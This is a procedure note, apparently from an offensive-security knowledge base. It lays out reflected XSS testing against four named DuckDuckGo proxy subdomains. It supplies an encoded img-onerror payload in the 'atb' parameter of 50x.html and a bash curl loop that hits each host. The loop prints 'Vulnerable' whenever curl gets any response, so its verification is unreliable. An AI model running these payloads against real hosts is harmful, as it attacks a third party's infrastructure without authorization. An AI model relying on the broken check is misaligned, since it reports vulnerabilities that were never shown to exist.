---
id: proc-verify-xss-subdomains
tags:
  - xss
  - subdomain-verification
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-test-xss-subdomain]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:37.495Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-XSS-on-Proxy-Subdomains

## Summary

This procedure validates the XSS vulnerability by repeating payload injection on multiple proxy subdomains to ensure consistent exploitation.

## Description

DuckDuckGo's proxy1-4.duckduckgo.com share the same unpatched 50x.html, allowing the 'atb' payload to execute identically across them, confirming broad impact on the proxy infrastructure.

## Requirements

1. List of subdomains (proxy1-4)
2. Proven payload from initial injection
3. Testing tool for batch verification

## Defense

Defensive measures and detection strategies:

- Synchronize patches across infrastructure
- Subdomain-specific monitoring for XSS attempts
- Automated regression testing post-fixes

## Objectives

1. Confirm exploit scope
2. Map affected components
3. Assess infrastructure-wide risk

## Instructions

### Step 1: List Subdomains

**Context**: Prepare targets for testing.

Subdomains: proxy1.duckduckgo.com, proxy2.duckduckgo.com, proxy3.duckduckgo.com, proxy4.duckduckgo.com

### Step 2: Test Each Subdomain

**Context**: Inject payload on each to verify execution.

For each, use [[commands/curl-test-xss-subdomain]] or browser: https://proxy1.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E

```bash
for sub in proxy1 proxy2 proxy3 proxy4; do curl -s "https://${sub}.duckduckgo.com/50x.html?e=&atb=test%22/%3E%3Cimg%20src=x%20onerror=alert(%27test%27);%3E" > /dev/null && echo "$sub: Vulnerable"; done
```

> Expected output: All subdomains echo 'Vulnerable'; alerts in browser.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-test-xss-subdomain]]

## Tools Used


## Tags

- [[xss]]
- [[subdomain-verification]]
